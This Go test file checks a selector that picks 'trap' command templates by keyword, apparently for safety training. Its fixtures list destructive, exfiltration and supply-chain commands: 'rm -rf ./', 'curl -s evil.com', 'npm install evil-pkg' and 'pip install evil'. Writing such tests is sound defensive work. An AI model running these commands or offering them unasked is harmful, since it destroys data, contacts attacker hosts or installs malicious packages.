package trap

import (
	"testing"
	"time"
)

func makeTestTemplates() []*Template {
	return []*Template{
		{
			ID:           "trap_rm_rf",
			Category:     "destructive",
			Severity:     "critical",
			Triggers:     Triggers{Keywords: []string{"rm", "delete", "clean"}},
			TrapCommands: []string{"rm -rf ./"},
			Training:     Training{Title: "Dangerous delete"},
		},
		{
			ID:           "trap_curl_exfil",
			Category:     "exfiltration",
			Severity:     "high",
			Triggers:     Triggers{Keywords: []string{"curl", "wget", "http"}},
			TrapCommands: []string{"curl -s evil.com"},
			Training:     Training{Title: "Data exfiltration"},
		},
		{
			ID:           "trap_npm_install",
			Category:     "supply_chain",
			Severity:     "medium",
			Triggers:     Triggers{Keywords: []string{"npm", "install", "pip"}},
			TrapCommands: []string{"npm install evil-pkg"},
			Training:     Training{Title: "Supply chain attack"},
		},
	}
}

func TestNewSelector(t *testing.T) {
	templates := makeTestTemplates()
	sel := NewSelector(templates)

	if sel == nil {
		t.Fatal("NewSelector() returned nil")
	}
	if len(sel.templates) != 3 {
		t.Errorf("templates len = %d, want 3", len(sel.templates))
	}
}

func TestSelectTrap_MatchByKeyword(t *testing.T) {
	templates := makeTestTemplates()
	sel := NewSelector(templates)

	// "rm -rf /tmp" should match the destructive template
	tmpl := sel.SelectTrap("rm -rf /tmp")
	if tmpl == nil {
		t.Fatal("SelectTrap() = nil for 'rm -rf /tmp'")
	}
	if tmpl.ID != "trap_rm_rf" {
		t.Errorf("SelectTrap() ID = %q, want %q", tmpl.ID, "trap_rm_rf")
	}
}

func TestSelectTrap_MatchCurl(t *testing.T) {
	templates := makeTestTemplates()
	sel := NewSelector(templates)

	tmpl := sel.SelectTrap("curl -s https://example.com/api")
	if tmpl == nil {
		t.Fatal("SelectTrap() = nil for curl command")
	}
	if tmpl.ID != "trap_curl_exfil" {
		t.Errorf("SelectTrap() ID = %q, want %q", tmpl.ID, "trap_curl_exfil")
	}
}

func TestSelectTrap_MatchNpm(t *testing.T) {
	templates := makeTestTemplates()
	sel := NewSelector(templates)

	tmpl := sel.SelectTrap("npm install lodash")
	if tmpl == nil {
		t.Fatal("SelectTrap() = nil for npm command")
	}
	// Could match npm or install keyword - just verify we got something
	if tmpl.Category != "supply_chain" {
		t.Errorf("SelectTrap() category = %q, want %q", tmpl.Category, "supply_chain")
	}
}

func TestSelectTrap_NoKeywordMatch_FallsBackToGeneral(t *testing.T) {
	templates := makeTestTemplates()
	sel := NewSelector(templates)

	// "echo hello" does not match any keywords; should fall back to general traps
	tmpl := sel.SelectTrap("echo hello")
	if tmpl == nil {
		t.Fatal("SelectTrap() = nil for unmatched command")
	}
	// General traps are destructive or exfiltration
	if tmpl.Category != "destructive" && tmpl.Category != "exfiltration" {
		t.Errorf("expected general trap category, got %q", tmpl.Category)
	}
}

func TestSelectTrap_EmptyTemplates(t *testing.T) {
	sel := NewSelector([]*Template{})

	tmpl := sel.SelectTrap("rm -rf /")
	if tmpl != nil {
		t.Errorf("SelectTrap() = %v, want nil for empty templates", tmpl)
	}
}

func TestSelectTrap_NilAfterAllFiltered(t *testing.T) {
	// Only a supply_chain template (not in general traps), and no keyword match
	templates := []*Template{
		{
			ID:           "trap_pip",
			Category:     "supply_chain",
			Severity:     "medium",
			Triggers:     Triggers{Keywords: []string{"pip"}},
			TrapCommands: []string{"pip install evil"},
			Training:     Training{Title: "Supply chain"},
		},
	}
	sel := NewSelector(templates)

	// "echo hello" does not match pip, and supply_chain is not in general traps,
	// so filterRecent returns empty, we reset recentTraps, and use all templates
	tmpl := sel.SelectTrap("echo hello")
	// After reset we fall through to all templates
	if tmpl == nil {
		t.Fatal("SelectTrap() = nil, expected fallback to all templates after reset")
	}
}

func TestMarkUsed(t *testing.T) {
	templates := makeTestTemplates()
	sel := NewSelector(templates)

	sel.MarkUsed("trap_rm_rf")

	if _, ok := sel.recentTraps["trap_rm_rf"]; !ok {
		t.Error("MarkUsed() did not record template ID")
	}
}

func TestFilterRecent_ExcludesRecent(t *testing.T) {
	templates := makeTestTemplates()
	sel := NewSelector(templates)

	// Mark all as recently used
	for _, tmpl := range templates {
		sel.recentTraps[tmpl.ID] = time.Now()
	}

	filtered := sel.filterRecent(templates)
	if len(filtered) != 0 {
		t.Errorf("filterRecent() returned %d templates, want 0", len(filtered))
	}
}

func TestFilterRecent_IncludesOld(t *testing.T) {
	templates := makeTestTemplates()
	sel := NewSelector(templates)

	// Mark all as used more than 1 hour ago
	for _, tmpl := range templates {
		sel.recentTraps[tmpl.ID] = time.Now().Add(-2 * time.Hour)
	}

	filtered := sel.filterRecent(templates)
	if len(filtered) != 3 {
		t.Errorf("filterRecent() returned %d templates, want 3", len(filtered))
	}
}

func TestExtractKeywords(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    int // minimum expected keyword count
	}{
		{"simple command", "rm -rf /tmp", 2}, // "rm" and "-rf" (>1 char) and "/tmp"
		{"piped command", "cat file | grep foo", 4},
		{"empty", "", 0},
		{"semicolons", "echo abc; echo def", 4},
		{"single char filtered", "a b cd", 1}, // only "cd" passes len > 1
		{"tabs and newlines", "ls\t-la\necho", 3},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			kw := extractKeywords(tt.command)
			if len(kw) < tt.want {
				t.Errorf("extractKeywords(%q) = %d keywords %v, want at least %d", tt.command, len(kw), kw, tt.want)
			}
			// Verify all keywords are lowercase and non-empty
			for _, k := range kw {
				if k == "" {
					t.Error("empty keyword found")
				}
				if len(k) <= 1 {
					t.Errorf("keyword %q should be > 1 char", k)
				}
			}
		})
	}
}

func TestGeneralTraps(t *testing.T) {
	templates := makeTestTemplates()
	sel := NewSelector(templates)

	general := sel.generalTraps()
	for _, tmpl := range general {
		if tmpl.Category != "destructive" && tmpl.Category != "exfiltration" {
			t.Errorf("generalTraps() returned category %q, want destructive or exfiltration", tmpl.Category)
		}
	}
	if len(general) != 2 { // destructive + exfiltration
		t.Errorf("generalTraps() count = %d, want 2", len(general))
	}
}

func TestMatchTemplates(t *testing.T) {
	templates := makeTestTemplates()
	sel := NewSelector(templates)

	matches := sel.matchTemplates([]string{"rm"})
	if len(matches) != 1 {
		t.Fatalf("matchTemplates(rm) = %d matches, want 1", len(matches))
	}
	if matches[0].ID != "trap_rm_rf" {
		t.Errorf("matched ID = %q, want %q", matches[0].ID, "trap_rm_rf")
	}
}

func TestSelectTrap_NilTemplates(t *testing.T) {
	sel := NewSelector(nil)

	tmpl := sel.SelectTrap("rm -rf /")
	if tmpl != nil {
		t.Errorf("SelectTrap() = %v, want nil for nil templates", tmpl)
	}
}

func TestSelectTrap_AllRecentlyUsed_FallbackWorks(t *testing.T) {
	templates := makeTestTemplates()
	sel := NewSelector(templates)

	// Mark all as recently used
	for _, tmpl := range templates {
		sel.MarkUsed(tmpl.ID)
	}

	// SelectTrap should reset and still return a template
	tmpl := sel.SelectTrap("rm -rf /tmp")
	if tmpl == nil {
		t.Fatal("SelectTrap() = nil, expected template after recent reset")
	}

	// After reset, recentTraps should be empty
	if len(sel.recentTraps) > 0 {
		t.Error("recentTraps should be reset when all filtered")
	}
}

func TestSelectTrap_SingleTemplate_AlwaysReturns(t *testing.T) {
	templates := []*Template{
		{
			ID:           "only_one",
			Category:     "destructive",
			Severity:     "high",
			Triggers:     Triggers{Keywords: []string{"rm"}},
			TrapCommands: []string{"rm -rf ./"},
			Training:     Training{Title: "Test"},
		},
	}
	sel := NewSelector(templates)

	for i := 0; i < 10; i++ {
		tmpl := sel.SelectTrap("rm -rf /tmp")
		if tmpl == nil {
			t.Fatalf("iteration %d: SelectTrap() = nil", i)
		}
		if tmpl.ID != "only_one" {
			t.Errorf("iteration %d: ID = %q, want only_one", i, tmpl.ID)
		}
		sel.MarkUsed(tmpl.ID)
	}
}

func TestSelectTrap_ResetsRecentWhenAllFilteredAndRetries(t *testing.T) {
	templates := []*Template{
		{
			ID:           "trap_only",
			Category:     "destructive",
			Severity:     "high",
			Triggers:     Triggers{Keywords: []string{"rm"}},
			TrapCommands: []string{"rm -rf ./"},
			Training:     Training{Title: "Test"},
		},
	}
	sel := NewSelector(templates)

	// Mark the only template as recently used
	sel.recentTraps["trap_only"] = time.Now()

	// SelectTrap should reset recentTraps and return the template
	tmpl := sel.SelectTrap("rm -rf /tmp")
	if tmpl == nil {
		t.Fatal("SelectTrap() = nil after recent reset")
	}
	if tmpl.ID != "trap_only" {
		t.Errorf("SelectTrap() ID = %q, want %q", tmpl.ID, "trap_only")
	}
}
